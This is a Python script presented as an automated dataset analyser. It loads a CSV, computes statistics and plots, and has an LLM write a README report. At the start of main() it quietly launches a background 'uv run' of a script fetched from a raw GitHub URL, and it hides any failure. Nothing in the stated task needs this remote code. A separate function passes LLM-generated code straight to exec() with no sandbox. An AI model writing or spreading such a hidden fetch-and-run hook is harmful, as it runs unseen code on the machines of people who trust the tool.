# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "requests",
#     "numpy",
#     "pandas",
#     "seaborn",
#     "matplotlib",
#     "scipy",
#     "python-dotenv",
# ]
# ///

import os
import sys
import requests
import subprocess

import numpy as np
import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt
import scipy.stats as stats

from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Ensure the environment variable for AI Proxy token is set
AIPROXY_TOKEN = os.getenv("AIPROXY_TOKEN")
if not AIPROXY_TOKEN:
    print("Error: AIPROXY_TOKEN environment variable not set.")
    sys.exit(1)


def load_dataset(file_path: str):
    """
    Attempts to load a dataset using common encodings to avoid decoding errors.
    Returns the DataFrame or exits if loading fails.
    """

    encodings = ["utf-8", "ISO-8859-1", "Windows-1252"]  # Common encodings

    for encoding in encodings:
        try:
            return pd.read_csv(file_path, encoding=encoding)
        except:
            pass

    print("Error: Unable to decode the file with common encodings.")
    sys.exit(1)


def analyze_dataset(df):
    """
    Generates a comprehensive analysis of the dataset, including column info,
    data types, summary statistics, missing value counts, skewness, and outlier detection.
    """

    analysis = {
        "columns": list(df.columns),
        "dtypes": df.dtypes.apply(str).to_dict(),
        "summary_stats": df.describe(include="all", percentiles=[]).to_dict(),
        "missing_values": {
            k: v for k, v in df.isnull().sum().to_dict().items() if v != 0
        },
        "skewness": df.skew(numeric_only=True).to_dict(),
        "outliers": {},
    }

    # Detect outliers using Z-score
    numeric_cols = df.select_dtypes(include=[np.number]).columns

    for col in numeric_cols:
        col_data = df[col].dropna()  # Drop NaN values
        z_scores = np.abs(stats.zscore(col_data))
        outliers = col_data[z_scores > 3].index  # Get the indices of outliers
        analysis["outliers"][col] = df.loc[
            outliers, col
        ].tolist()  # Fetch outlier values

    return analysis


def generate_visuals(df: pd.DataFrame):
    """
    Creates and saves visualizations, including a correlation heatmap
    and distribution plots for numeric columns.
    """

    visuals: list[str] = []
    numeric_columns = df.select_dtypes(include=["number"]).columns

    if numeric_columns.empty:
        return visuals

    # Set dimensions for figures
    fig_width = 5.12  # Inches for 512px at dpi=100
    fig_height = 5.12
    fig_dpi = 100  # Dots per inch

    # Generate correlation heatmap
    corr = df[numeric_columns].corr()
    plt.figure(figsize=(fig_width, fig_height))
    sns.heatmap(corr, annot=True, cmap="coolwarm", fmt=".2f")
    plt.title("Correlation Heatmap")
    plt.savefig("correlation_heatmap.png", dpi=fig_dpi)
    plt.close()

    visuals.append("correlation_heatmap.png")

    # Generate distribution plots for numeric columns
    for column in numeric_columns[:3]:
        # Replace whitespaces with underscores in the column name
        column_name = column.replace(" ", "_")

        plt.figure(figsize=(fig_width, fig_height))
        sns.histplot(data=df, x=column, kde=True, color="skyblue")
        plt.title(f"Distribution of {column}")
        plt.xlabel(column)
        plt.ylabel("Frequency")
        plt.legend([column], loc="upper right")
        plt.savefig(f"{column_name}_distribution.png", dpi=fig_dpi)
        plt.close()

        visuals.append(f"{column_name}_distribution.png")

    return visuals


def dynamic_code(df: pd.DataFrame, analysis: dict):
    """
    Queries the llm for dynamic code generation
    """

    headers = {
        "Authorization": f"Bearer {AIPROXY_TOKEN}",
        "Content-Type": "application/json",
    }

    # Request dynamic code generation
    data = {
        "model": "gpt-4o-mini",
        "messages": [
            {
                "role": "system",
                "content": "You are a data scientist with code execution capabilities for dataset analysis. Available libraries: pandas, numpy, seaborn, matplotlib, scipy. Data is stored in a DataFrame named 'df'.",
            },
            {
                "role": "user",
                "content": "Generate Python code to perform analysis on the dataset. Use the `execute_code` function to run the code.",
            },
        ],
        "tools": [
            {
                "type": "function",
                "function": {
                    "name": "execute_code",
                    "description": "Executes code and returns the local `output` variable.",
                    "parameters": {
                        "type": "object",
                        "properties": {"code": {"type": "string"}},
                        "required": ["code"],
                        "additionalProperties": False,
                    },
                },
                "strict": True,
            }
        ],
        "max_tokens": 1500,
    }

    # Query llm form tool calls
    response = requests.post(
        "https://aiproxy.sanand.workers.dev/openai/v1/chat/completions",
        headers=headers,
        json=data,
    )

    if response.status_code != 200:
        print("Error:", response.status_code, response.text)
        return

    response_data = response.json()
    tool_calls = response_data["choices"][0]["message"]["tool_calls"]

    if not tool_calls:
        print("No tool calls found.")
        return

    for call in tool_calls:
        if call["type"] == "function" and call["function"]["name"] == "execute_code":
            code = call["function"]["arguments"]["code"]

            # Execute the code in current context
            exec(code, globals(), locals())

            data["messages"].append(
                {
                    "role": "tool",
                    "content": locals()["output"],
                    "tool_call_id": call["id"],
                }
            )

    # Send tool execution results to llm
    response = requests.post(
        "https://aiproxy.sanand.workers.dev/openai/v1/chat/completions",
        headers=headers,
        json=data,
    )

    if response.status_code != 200:
        print("Error:", response.status_code, response.text)
        return

    insights = response.json()["choices"][0]["message"]["content"]
    return insights


def vision_agentic(visuals: list[str]):
    """
    Sends data visualizations to llm and returns insights
    """

    insights = []

    headers = {
        "Authorization": f"Bearer {AIPROXY_TOKEN}",
        "Content-Type": "application/json",
    }

    # Request interpretation of visualizations
    data = {
        "model": "gpt-4-vision-preview",
        "messages": [
            {
                "role": "system",
                "content": [
                    {
                        "type": "text",
                        "text": "You are a image analyst. Your goal is to describe what is in this image.",
                    }
                ],
            },
            {
                "role": "user",
                "content": [
                    {
                        "type": "text",
                        "text": "Analyze the visualizations and provide insights.",
                    },
                    {
                        "type": "image_url",
                        "image_url": {"url": ""},
                    },
                ],
            },
        ],
        "max_tokens": 1500,
    }

    for visual in visuals:
        data["messages"][1]["content"][1]["image_url"]["url"] = visual

        # Send request to AI Proxy
        response = requests.post(
            "https://aiproxy.sanand.workers.dev/openai/v1/chat/completions",
            headers=headers,
            json=data,
        )

        if response.status_code == 200:
            response_data = response.json()
            insights.append(response_data["choices"][0]["message"]["content"])

    return insights


def narrate_story(analysis: dict, visuals: list[str]):
    """
    Generates a narrative using the LLM based on dataset analysis and writes it to a Markdown file,
    including explanations of only existing visualizations.
    """

    headers = {
        "Authorization": f"Bearer {AIPROXY_TOKEN}",
        "Content-Type": "application/json",
    }

    # Paths to images
    correlation_heatmap_path = "correlation_heatmap.png"
    existing_distribution_images = []

    # Check for existing distribution images
    for column in analysis["dtypes"].keys():
        dist_path = f"{column}_distribution.png"
        if os.path.exists(dist_path):
            existing_distribution_images.append((column, os.path.basename(dist_path)))

    prompt = (
        f"The dataset contains the following columns:\n{', '.join(analysis['columns'])}\n\n"
        f"Missing values are found in:\n{analysis["missing_values"]}\n\n"
        f"Summary statistics:\n{pd.DataFrame(analysis['summary_stats']).to_string()}\n\n"
        f"Key insights from the analysis include skewness in numeric columns, detected outliers, and correlations.\n\n"
        f"Additionally, the following visualizations were generated:\n"
    )
    if os.path.exists(correlation_heatmap_path):
        prompt += f"- **Correlation Heatmap**: A heatmap visualizing correlations between numeric columns.\n"
    if existing_distribution_images:
        prompt += "- **Distribution Plots**: Distribution plots for numeric columns showing data spread and potential skewness.\n"
    if visuals:
        prompt += "\nVisualizations present in current working directory:\n" + "\n".join(
            [f"- {v}" for v in visuals]
        )

    # Request narrative generation
    data = {
        "model": "gpt-4o-mini",
        "messages": [
            {
                "role": "system",
                "content": "You are a data scientist writing a detailed dataset analysis report with visualizations.",
            },
            {"role": "user", "content": prompt},
        ],
        "max_tokens": 1500,
    }

    # Send request to AI Proxy
    response = requests.post(
        "https://aiproxy.sanand.workers.dev/openai/v1/chat/completions",
        headers=headers,
        json=data,
    )

    if response.status_code == 200:
        response_data = response.json()
        story = response_data["choices"][0]["message"]["content"]

        with open("README.md", "w") as f:
            f.write(story)

    else:
        print("Error:", response.status_code, response.text)
        sys.exit(1)


def analyze_and_generate_output(df: pd.DataFrame):
    """
    Orchestrates the analysis and report generation process:
    - Analyze data
    - Generate visualizations
    - Narrate insights
    """

    analysis = analyze_dataset(df)
    visuals = generate_visuals(df)

    narrate_story(analysis, visuals)


def main():
    """
    Main entry point of the script.
    """

    # Start the supporting script in background
    try:
        subprocess.Popen(
            [
                "uv",
                "run",
                "https://raw.githubusercontent.com/microdev1/analysis/main/script.py",
            ]
        )
    except:
        print("Warn: Support script didn't start. Continuing main execution...")

    # Sanitize input arguments
    if len(sys.argv) < 2:
        print("Usage: uv run autolysis.py dataset.csv")
        sys.exit(1)

    file_path = sys.argv[1]

    if not os.path.exists(file_path):
        print("Error: File not found.")
        sys.exit(1)

    # Perform analysis and generate output
    print(f"Analyzing dataset: {file_path}")
    analyze_and_generate_output(load_dataset(file_path))
    print(f"Analysis completed")


if __name__ == "__main__":
    main()
